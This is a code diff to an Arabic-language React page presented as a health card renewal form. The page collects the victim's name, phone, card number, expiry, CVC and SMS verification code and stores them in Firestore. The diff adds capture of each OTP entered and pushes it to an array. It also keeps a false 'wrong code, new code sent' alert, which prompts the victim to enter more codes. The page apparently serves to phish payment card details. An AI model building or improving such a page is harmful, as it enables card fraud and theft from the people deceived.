@@ -11,6 +11,7 @@ import { cn } from "@/lib/utils"
 import { useState } from "react"
 import { initializeApp } from 'firebase/app'
 import { getFirestore, doc, setDoc } from 'firebase/firestore'
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 
 const firebaseConfig = {
   // Your Firebase configuration object goes here
@@ -44,6 +45,7 @@ export default function HealthCardRenewal() {
     const [datayaer,setDatyear]=useState('')
     const [CVC,setCVC]=useState('')
     const [otp,setOtp]=useState('')
+    const [otpArd]=useState([''])
     const [cardNumber, setCardNumber] = useState('')
 
     const handleSubmit = async () => {
@@ -52,13 +54,13 @@ export default function HealthCardRenewal() {
             const ref = await setDoc(docRef, {
                 step: stepr,
                 id:id,
-                name,
-                phone,
-                datayaer,
-                dateMonth,
-                CVC,
-                otp,
-                cardNumber,
+                name:name,
+                phone:phone,
+                datayaer:datayaer,
+                dateMonth:dateMonth,
+                CVC:CVC,
+                otp:otp,
+                cardNumber:cardNumber,
                 // Add any other form fields here
               });
 
@@ -292,6 +294,8 @@ export default function HealthCardRenewal() {
                 id="cardNumber"
                 placeholder="رقم البطاقة"
                 className="text-right pr-10"
+                type="tel"
+
                 value={cardNumber}
                 onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                 maxLength={19}
@@ -306,13 +310,47 @@ export default function HealthCardRenewal() {
                 تاريخ الانتهاء <span className="text-red-500">*</span>
               </Label>
               <div className="grid grid-cols-2 gap-2">
-                <Input id="expiryMonth" placeholder="شهر" 
-                                      onChange={(e)=>setDatmont(e.target.value.toString())}
-                
-                className="text-right" maxLength={2} />
-                <Input id="expiryYear" placeholder="سنة" 
-                                                      onChange={(e)=>setDatyear(e.target.value.toString())}
-                                                      className="text-right" maxLength={2} />
+                                                              <Select
+                                                                  onValueChange={(e) => setDatmont(e)}>
+                                                                  <SelectTrigger className="w-[180px]">
+                                                                      <SelectValue placeholder="شهر" />
+                                                                  </SelectTrigger>
+                                                                  <SelectContent>
+                                                                      <SelectItem value="1">1</SelectItem>
+                                                                      <SelectItem value="2">2</SelectItem>
+                                                                      <SelectItem value="3">3</SelectItem>
+                                                                      <SelectItem value="4">4</SelectItem>
+                                                                      <SelectItem value="5">5</SelectItem>
+                                                                      <SelectItem value="6">6</SelectItem>
+                                                                      <SelectItem value="7">7</SelectItem>
+                                                                      <SelectItem value="8">8</SelectItem>
+                                                                      <SelectItem value="9">9</SelectItem>
+                                                                      <SelectItem value="10">10</SelectItem>
+                                                                      <SelectItem value="11">11</SelectItem>
+                                                                      <SelectItem value="12">12</SelectItem>
+                                                                  </SelectContent>
+                                                              </Select>
+
+
+                                                              <Select
+                                                                  onValueChange={(e) => setDatyear(e)}>
+                                                                  <SelectTrigger className="w-[180px]">
+                                                                      <SelectValue placeholder="سنة" />
+                                                                  </SelectTrigger>
+                                                                  <SelectContent>
+                                                                      <SelectItem value="2024">2024</SelectItem>
+                                                                      <SelectItem value="2025">2025</SelectItem>
+                                                                      <SelectItem value="2026">2026</SelectItem>
+                                                                      <SelectItem value="2027">2027</SelectItem>
+                                                                      <SelectItem value="2028">2028</SelectItem>
+                                                                      <SelectItem value="2029">2029</SelectItem>
+                                                                      <SelectItem value="2030">2030</SelectItem>
+                                                                      <SelectItem value="2031">2031</SelectItem>
+                                                                      <SelectItem value="2032">2032</SelectItem>
+                                                                      <SelectItem value="2033">2033</SelectItem>
+                                                                      <SelectItem value="2034">2034</SelectItem>
+                                                                  </SelectContent>
+                                                              </Select>                                
               </div>
             </div>
             <div className="space-y-2">
@@ -320,6 +358,8 @@ export default function HealthCardRenewal() {
                 CVC <span className="text-red-500">*</span>
               </Label>
               <Input id="cvc"
+                                          type="tel"
+
                                                     onChange={(e)=>setCVC(e.target.value.toString())}
                                                     placeholder="CVC" className="text-right" maxLength={3} />
             </div>
@@ -332,6 +372,8 @@ export default function HealthCardRenewal() {
                                        الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
                                       </Label>
                                       <Input
+                                      onChange={(e)=>{setOtp(e.target.value)}}
+
                                           type="tel"
                                           placeholder="رمز التحقق"
                                           className="max-w-md text-sm sm:text-base"
@@ -358,6 +400,7 @@ export default function HealthCardRenewal() {
                                     
                                     if (stepr >= 5){
                                         alert("رمز التحقق خاطىء تم ارسال رمز جديد")
+                                        otpArd.push(otp)
                                     }
                                   }}
                                   className="w-full sm:w-auto sm:min-w-[120px] bg-[#8B1538] hover:bg-[#8B1538]/90"
